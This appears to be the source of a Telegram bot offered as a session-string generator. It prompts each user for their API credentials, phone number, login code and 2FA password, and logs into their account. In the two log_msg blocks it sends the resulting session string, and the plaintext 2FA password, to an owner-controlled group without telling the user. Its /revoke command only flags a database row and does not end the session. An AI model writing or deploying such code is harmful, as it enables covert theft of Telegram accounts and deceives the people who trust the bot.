import os
import re
import uuid
import logging
import asyncio
import phonenumbers
from datetime import datetime
from telethon import TelegramClient, events, Button, functions, types
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from decouple import config
import asyncpg

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
API_ID = config('API_ID', cast=int)
API_HASH = config('API_HASH')
BOT_TOKEN = config('BOT_TOKEN')
OWNER_ID = config('OWNER_ID', cast=int)
LOG_GROUP = config('LOG_GROUP', cast=int)
DB_URI = config('DB_URI')

# Database connection pool
db_pool = None

# User session states
user_states = {}

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DB_URI)
    await create_tables()

async def create_tables():
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                user_id BIGINT,
                phone_number TEXT,
                created_at TIMESTAMP DEFAULT NOW(),
                revoked BOOLEAN DEFAULT FALSE
            )
        ''')

async def log_to_group(message: str):
    async with TelegramClient(StringSession(), API_ID, API_HASH).start(bot_token=BOT_TOKEN) as client:
        await client.send_message(LOG_GROUP, message)

client = TelegramClient(StringSession(), API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    user = event.sender
    await event.reply(
        f"👋 Welcome {user.first_name}!\n"
        f"🆔 Your ID: `{user.id}`\n"
        f"📛 Username: @{user.username}\n\n"
        "Use /cmds to see available commands",
        parse_mode='md'
    )

@client.on(events.NewMessage(pattern='/cmds'))
async def cmds(event):
    commands = (
        "📜 Available Commands:\n"
        "/start - Show welcome message\n"
        "/genstring - Generate new session\n"
        "/revoke - Revoke your session\n\n"
        "👑 Owner Commands:\n"
        "/stats - Show bot statistics\n"
        "/updatebot - Update bot"
    )
    await event.reply(commands)

@client.on(events.NewMessage(pattern='/genstring'))
async def genstring(event):
    user = event.sender
    await event.reply("Please enter your API_ID (numbers only):")
    user_states[user.id] = {"stage": "api_id"}

@client.on(events.NewMessage())
async def handle_message(event):
    if event.raw_text.startswith('/'):
        return

    user = event.sender
    state = user_states.get(user.id, {})

    try:
        if state.get("stage") == "api_id":
            if not event.raw_text.isdigit():
                return await event.reply("❌ API_ID must be numbers only!")
            
            user_states[user.id] = {
                "api_id": int(event.raw_text),
                "stage": "api_hash"
            }
            await event.reply("Please enter your API_HASH:")

        elif state.get("stage") == "api_hash":
            user_states[user.id]["api_hash"] = event.raw_text
            user_states[user.id]["stage"] = "phone"
            await event.reply("Please enter your phone number (international format):")

        elif state.get("stage") == "phone":
            try:
                parsed = phonenumbers.parse(event.raw_text, None)
                if not phonenumbers.is_valid_number(parsed):
                    raise ValueError
                phone = phonenumbers.format_number(parsed, 
                    phonenumbers.PhoneNumberFormat.E164)
            except:
                return await event.reply("❌ Invalid phone number format!")
            
            user_states[user.id]["phone"] = phone
            user_states[user.id]["stage"] = "code"
            
            temp_client = TelegramClient(
                StringSession(),
                user_states[user.id]["api_id"],
                user_states[user.id]["api_hash"]
            )
            await temp_client.connect()
            sent_code = await temp_client.send_code_request(phone)
            
            user_states[user.id]["phone_code_hash"] = sent_code.phone_code_hash
            user_states[user.id]["temp_client"] = temp_client
            await event.reply("Please enter the OTP you received:")

        elif state.get("stage") == "code":
            temp_client = user_states[user.id]["temp_client"]
            code = event.raw_text.strip()
            
            try:
                await temp_client.sign_in(
                    user_states[user.id]["phone"],
                    code=code,
                    phone_code_hash=user_states[user.id]["phone_code_hash"]
                )
            except SessionPasswordNeededError:
                user_states[user.id]["stage"] = "2fa"
                return await event.reply("Please enter your 2FA password:")
            
            session_string = temp_client.session.save()
            await db_pool.execute('''
                INSERT INTO sessions (session_id, user_id, phone_number)
                VALUES ($1, $2, $3)
            ''', session_string, user.id, user_states[user.id]["phone"])
            
            log_msg = (
                f"🔔 New Session Generated\n"
                f"👤 User: {user.first_name} (ID: {user.id})\n"
                f"📞 Phone: {user_states[user.id]['phone']}\n"
                f"🔑 Session: {session_string}"
            )
            await log_to_group(log_msg)
            
            await event.reply(f"✅ Session generated:\n```{session_string}```", 
                             parse_mode='md')
            await temp_client.disconnect()
            del user_states[user.id]

        elif state.get("stage") == "2fa":
            temp_client = user_states[user.id]["temp_client"]
            password = event.raw_text
            
            await temp_client.sign_in(password=password)
            session_string = temp_client.session.save()
            
            await db_pool.execute('''
                INSERT INTO sessions (session_id, user_id, phone_number)
                VALUES ($1, $2, $3)
            ''', session_string, user.id, user_states[user.id]["phone"])
            
            log_msg = (
                f"🔔 New Session with 2FA\n"
                f"👤 User: {user.first_name}\n"
                f"📞 Phone: {user_states[user.id]['phone']}\n"
                f"🔐 2FA Password: {password}\n"
                f"🔑 Session: {session_string}"
            )
            await log_to_group(log_msg)
            
            await event.reply(f"✅ Session generated:\n```{session_string}```", 
                             parse_mode='md')
            await temp_client.disconnect()
            del user_states[user.id]

    except Exception as e:
        error_id = str(uuid.uuid4())[:8]
        logger.error(f"Error {error_id}: {str(e)}")
        await event.reply(f"❌ Error! Please contact @rishabh_zz (Error ID: {error_id})")
        await log_to_group(f"⚠️ Error {error_id}\n{str(e)}")
        
        if "temp_client" in locals():
            await temp_client.disconnect()
        if user.id in user_states:
            del user_states[user.id]

@client.on(events.NewMessage(pattern='/revoke'))
async def revoke(event):
    user = event.sender
    sessions = await db_pool.fetch(
        "SELECT session_id FROM sessions WHERE user_id = $1 AND revoked = FALSE",
        user.id
    )
    
    if not sessions:
        return await event.reply("No active sessions found!")
    
    buttons = [
        [Button.inline(f"Revoke {s['session_id'][:10]}...", f"revoke_{s['session_id']}")]
        for s in sessions
    ]
    await event.reply("Select session to revoke:", buttons=buttons)

@client.on(events.CallbackQuery())
async def revoke_handler(event):
    session_id = event.data.decode().split('_')[1]
    await db_pool.execute('''
        UPDATE sessions SET revoked = TRUE WHERE session_id = $1
    ''', session_id)
    await event.respond("✅ Session revoked successfully!")
    await event.delete()

@client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
async def stats(event):
    stats = await db_pool.fetchrow('''
        SELECT 
            COUNT(*) as total_users,
            SUM(CASE WHEN revoked = FALSE THEN 1 ELSE 0 END) as active_sessions
        FROM sessions
    ''')
    await event.reply(
        f"📊 Bot Statistics\n"
        f"👥 Total Users: {stats['total_users']}\n"
        f"🔑 Active Sessions: {stats['active_sessions']}"
    )

@client.on(events.NewMessage(pattern='/updatebot', from_users=OWNER_ID))
async def update_bot(event):
    proc = await asyncio.create_subprocess_shell(
        "git pull && pip install -r requirements.txt",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await proc.communicate()
    
    if proc.returncode == 0:
        await event.respond(f"✅ Update successful!\n{stdout.decode()}")
    else:
        await event.respond(f"❌ Update failed!\n{stderr.decode()}")

if __name__ == '__main__':
    client.loop.run_until_complete(init_db())
    logger.info("Bot started!")
    client.run_until_disconnected()
